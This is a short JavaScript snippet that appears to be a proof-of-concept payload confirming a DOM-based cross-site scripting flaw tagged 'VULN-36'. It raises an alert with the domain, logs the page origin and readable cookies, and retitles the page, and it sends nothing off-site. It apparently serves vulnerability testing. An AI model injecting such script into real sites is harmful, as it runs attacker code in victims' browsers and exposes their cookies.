alert('DOM XSS confirmed on '+document.domain+' \u2014 VULN-36 Raman_MG');
console.log('[VULN-36 PoC] executing in origin:', location.origin, '| cookies readable by attacker JS:', document.cookie);
document.title = 'XSS-'+document.domain;
